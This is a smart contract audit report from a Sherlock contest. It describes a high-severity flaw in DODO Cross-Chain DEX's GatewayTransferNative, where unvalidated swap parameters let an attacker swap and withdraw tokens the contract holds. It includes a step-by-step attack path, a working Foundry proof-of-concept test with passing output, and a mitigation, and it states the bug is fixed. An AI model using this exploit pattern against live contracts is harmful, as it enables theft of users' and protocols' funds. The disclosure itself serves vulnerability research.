---
tags:
  - lang/solidity
  - sector/bridge
  - sector/dex
  - sector/stable
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
protocol: "[[DODO Cross Chain DEX]]"
auditors:
  - HeckerTrieuTien
report: "https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging"
genome:
  - "[[bridge-message-validation]]"
  - "[[direct-drain]]"
  - "[[variant]]"
---
# H-4: `GatewayTransferNative.withdrawToNativeChain` Allows Swapping Arbitrary Contract ZRC20s by Misusing Deposited Token Amount

- id: 58581
- impact: HIGH
- protocol: DODO Cross-Chain DEX
- reporter: HeckerTrieuTien (Sherlock)
- source: N/A

## Summary


This bug report discusses a vulnerability found in the GatewayTransferNative contract, which is part of the DODO cross-chain decentralized exchange. The vulnerability allows an attacker to drain funds from the contract by depositing a low-value token and instructing the contract to swap a different, more valuable token that it holds. This is possible because the contract does not validate that the input token for the swap matches the token deposited by the user. The attacker can then withdraw the swapped funds to an external chain or transfer them on ZetaChain. The root cause of this bug is a missing check in the `withdrawToNativeChain` function, which calls the `_doMixSwap` function without verifying that the `params.fromToken` matches the deposited token. This issue can be mitigated by adding checks before calling `_doMixSwap` to ensure that the `params.fromToken` and `params.fromTokenAmount` are valid. The DODO protocol team has fixed this issue in their code.

## Details


Source: https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-judging/issues/681 

## Found by 
0xdice91, 10ap17, AnomX, AshishLac, Cybrid, EgisSecurity, Falendar, Goran, HeckerTrieuTien, OrangeSantra, Phaethon, X0sauce, Yaneca\_b, ZeroTrust, bladeee, d4y1ight, hunt1, iamandreiski, ifeco445, khaye26, patitonar, phrax, pyk, radevweb3, roshark, rsam\_eth, seeques, shushu, silver\_eth, the\_haritz, theboiledcorn


### Summary

The [`GatewayTransferNative.withdrawToNativeChain`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L530-L534) function allows users to specify DODO swap parameters via the `message` argument. It fails to validate that the input token for this swap (`params.fromToken` derived from `message`) matches the `zrc20` token actually deposited by the user for the transaction. Instead, the contract uses the deposited `amount` of `zrc20` to approve its _own balance_ of `params.fromToken` for the swap. An attacker can deposit a low-value `zrc20` and provide a `message` instructing the contract to swap a different, valuable token it holds, leading to fund drain. The swapped proceeds are then processed for withdrawal to an external chain or transfer on ZetaChain as specified by other parts of the `message`.

### Root Cause

The bug lies in `GatewayTransferNative` when `withdrawToNativeChain` calls `_doMixSwap`.

1.  **User Input:** User calls `withdrawToNativeChain`.

    - `zrc20` and `amount` are the primary deposit by the user directly to this function.
    - `message` is decoded using `SwapDataHelperLib.decodeMessage` into `DecodedMessage memory decoded`. The DODO swap parameters `MixSwapParams memory params` are derived from `decoded.swapDataZ`. Crucially, `params.fromToken` and `params.fromTokenAmount` are sourced from this user-controlled `decoded.swapDataZ`.

    ```solidity
    function withdrawToNativeChain(address zrc20, uint256 amount, bytes calldata message) external payable {
        // ... user token handling (transferFrom or msg.value) ...
        globalNonce++;
        bytes32 externalId = _calcExternalId(msg.sender);
        (DecodedMessage memory decoded, MixSwapParams memory params) = SwapDataHelperLib.decodeMessage(message);
        // ...
        uint256 platformFeesForTx = _handleFeeTransfer(zrc20, amount);
        uint256 currentAmount = amount - platformFeesForTx; // This is amountAfterFee
        // ...
        uint256 outputAmount = _doMixSwap(decoded.swapDataZ, currentAmount, params);
        // ... proceeds to withdrawal logic ...
    }
    ```

2.  **Fee Handling:** Platform fees are taken from the deposited `amount` of `zrc20`. Let the remainder be `currentAmount` (passed as `amount` to `_doMixSwap`).

3.  **Missing Critical Check**: Before calling `_doMixSwap`, there is no check to ensure that `params.fromToken` is the same as `zrc20`.

4.  **Logic in `_doMixSwap` Call:** `_doMixSwap` is called with `currentAmount` and `params`.

    ```solidity
    function _doMixSwap(
        bytes memory swapData, // This is decoded.swapDataZ
        uint256 amount,        // This is currentAmount
        MixSwapParams memory params
    ) internal returns (uint256 outputAmount) {
        if (swapData.length == 0) {
            return amount;
        }

        IZRC20(params.fromToken).approve(DODOApprove, amount); // 'amount' zrc20
        return IDODORouteProxy(DODORouteProxy).mixSwap{ value: msg.value }(
            params.fromToken,
            params.toToken,
            params.fromTokenAmount, // Uses amount from payload for actual swap quantity
            // ... other params
        );
    }
    ```

    If `params.fromToken` is different from the `zrc20` deposited by the user, `GatewayTransferNative` approves its own balance of `params.fromToken` for `DODOApprove` to use. The approval amount is `amount`. The DODO swap then attempts to use `params.fromTokenAmount` of `params.fromToken`. If `params.fromTokenAmount` is less than or equal to `amount`, the swap will use `GatewayTransferNative`'s funds of `params.fromToken`.

### Internal Pre-conditions

1.  The `GatewayTransferNative` contract must have a non-zero balance of a ZRC20 token that the attacker intends to use as `params.fromToken` and drain. This condition is highly likely to be met for various tokens over time, as the contract's refund mechanism can cause it to accumulate different ZRC20s.
2.  `DODORouteProxy` and `DODOApprove` addresses must be correctly set in `GatewayTransferNative`.

### External Pre-conditions

1.  The DODO protocol on ZetaChain must have a liquidity pool for the swap pair defined in `params.fromToken` / `params.toToken`.

### Attack Path

1.  **Pre-condition:** `GatewayTransferNative` contract holds `1 ETH.ETH` ZERC20. Attacker has `1 DAI.ETH` ZRC20 and has approved `GatewayTransferNative` to spend them.
2.  **Attacker's Action:** Attacker calls `GatewayTransferNative.withdrawToNativeChain`:
    - `zrc20`: `address(DAI.ETH)`
    - `amount`: `1e18` (1 DAI.ETH)
    - `message`: Crafted by attacker. When decoded by `SwapDataHelperLib.decodeMessage`:
      - `decoded.dstChainId`: e.g. Base
      - `decoded.targetZRC20`: `address(DAI.ETH)`.
      - `decoded.receiver`: Attacker's address on the destination chain.
      - `decoded.swapDataZ` (this generates `params` for `_doMixSwap`):
        - `params.fromToken`: `address(ETH.ETH)`.
        - `params.toToken`: `address(DAI.ETH)`.
        - `params.fromTokenAmount`: `1e18`.
        - `params.minReturnAmount`: `0`.
        - Other `MixSwapParams` fields set as needed.
      - `decoded.swapDataB`: Can be empty or specify further swaps on the destination chain.
3.  **Execution within `withdrawToNativeChain`:**
    - User's `1 DAI.ETH` are transferred to `GatewayTransferNative`.
    - Platform fees are deducted from `1 DAI.ETH`. Assume zero fees and `amountAfterFee` becomes `1e18 DAI.ETH`.
    - `_doMixSwap(decoded.swapDataZ, amountAfterFee, params)` is called.
      - Inside `_doMixSwap`: `IZRC20(ETH.ETH).approve(DODOApprove, 1e18);` executes. `GatewayTransferNative` approves its _own_ `ETH.ETH` balance for up to `1e18` wei.
      - `IDODORouteProxy.mixSwap` is called to swap `1e18` (`params.fromTokenAmount`) of `ETH.ETH` from `GatewayTransferNative`'s balance into `DAI.ETH`. Assuming 1 ETH = 2500 DAI, this yields approximately `2500 DAI.ETH`. Let this be `outputAmount`.
    - Back in `withdrawToNativeChain`, `outputAmount` (`2500 DAI.ETH`) is now processed for withdrawal. Since `params.toToken (DAI.ETH)` matches `decoded.targetZRC20 (DAI.ETH)`, the withdrawal logic for `DAI.ETH` proceeds using this `outputAmount`.
4.  **Result**: `GatewayTransferNative` loses `1 ETH.ETH` (worth $2500). Attacker deposited `1 DAI.ETH` (worth $1). The attacker profits the difference, ultimately receiving the swapped value on their specified destination chain/address.

### Impact

Direct loss of ZRC20 token holdings from the `GatewayTransferNative` contract. An attacker can target any ZRC20 held by the contract by depositing a sufficient amount of a less valuable token via `withdrawToNativeChain` and crafting a malicious `message` payload.

### PoC

Add this test to `test/GatewayTransferNative.t.sol`:

```solidity
/// @dev This bug allows anyone to depost less valuable token to get more valuable token
/// @custom:command forge test --match-contract GatewayTransferNativeTest --match-test test_WithdrawValuableTokens --fork-url https://zetachain-mainnet.g.allthatnode.com/archive/evm
function test_WithdrawValuableTokens() public {
    address attacker = makeAddr("attacker");

    // Assets
    ERC20Mock dai = new ERC20Mock("DAI", "DAI", 18);
    ZRC20Mock zrc20DAI = new ZRC20Mock("ZetaChain DAI Ethereum", "DAI.ETH", 18);
    ZRC20Mock zrc20ETH = new ZRC20Mock("ZetaChain ETH Ethereum", "ETH.ETH", 18);
    uint256 amount = 1e18;

    // Balances
    zrc20DAI.mint(attacker, amount); // 1 DAI.ETH
    zrc20ETH.mint(address(gatewayTransferNative), amount); // 1 ETH.ETH e.g. for refund failed cross-chain tx
    zrc20DAI.mint(address(dodoRouteProxyZ), 2500 * 1e18); // Swaps Liquidity
    dai.mint(address(gatewayB), 2500 * 1e18); // Escrowed Liquidity

    // Gateways
    gatewayB.setZRC20(address(dai), address(zrc20DAI));
    zrc20DAI.setGasFee(0); // For simplicity
    zrc20DAI.setGasZRC20(address(zrc20DAI));

    // 1 ETH = 2500 DAI, no slippage for simplicity
    dodoRouteProxyZ.setPrice(address(zrc20ETH), address(zrc20DAI), 2500 * 1e18);

    // Approvals
    vm.prank(attacker);
    zrc20DAI.approve(address(gatewayTransferNative), amount);

    uint32 dstChainId = 2;
    address targetZRC20 = address(zrc20DAI);
    bytes memory sender = abi.encodePacked(attacker);
    bytes memory receiver = abi.encodePacked(attacker);
    bytes memory swapDataZ = encodeCompressedMixSwapParams(
        address(zrc20ETH), // !!!!
        address(zrc20DAI), // !!!!
        amount,
        0,
        0,
        new address[](1),
        new address[](1),
        new address[](1),
        0,
        new bytes[](1),
        abi.encode(address(0), 0),
        block.timestamp + 600
    );
    bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
    bytes memory fromTokenB = abi.encodePacked(address(dai));
    bytes memory toTokenB = abi.encodePacked(address(dai));
    bytes memory swapDataB = "";
    bytes memory accounts = "";
    bytes memory message = encodeMessage(
        dstChainId,
        targetZRC20,
        sender,
        receiver,
        swapDataZ,
        contractAddress,
        abi.encodePacked(fromTokenB, toTokenB, swapDataB),
        accounts
    );

    vm.prank(attacker);
    gatewayTransferNative.withdrawToNativeChain(address(zrc20DAI), amount, message);

    // Deposit 1 DAI got 2500 DAI
    assertEq(zrc20DAI.balanceOf(attacker), 0);
    assertEq(dai.balanceOf(attacker), 2500 * 1e18);
}
```

Run the test:

```shell
forge test --match-contract GatewayTransferNativeTest --match-test test_WithdrawValuableTokens --fork-url https://zetachain-mainnet.g.allthatnode.com/archive/evm
```

```shell
[⠊] Compiling...
[⠃] Compiling 1 files with Solc 0.8.26
[⠊] Solc 0.8.26 finished in 23.72s
Compiler run successful!

Ran 1 test for test/GatewayTransferNative.t.sol:GatewayTransferNativeTest
[PASS] test_WithdrawValuableTokens() (gas: 1888387)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.84ms (2.11ms CPU time)

Ran 1 test suite in 529.76ms (9.84ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Mitigation

In `GatewayTransferNative`, within the `withdrawToNativeChain` function, before calling `_doMixSwap`, add checks to ensure `params.fromToken` (derived from `message` via `decoded.swapDataZ`) matches the `zrc20` argument provided by the user, and `params.fromTokenAmount` is not more than the (post-fee) `amount` argument.


## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Skyewwww/omni-chain-contracts/pull/33





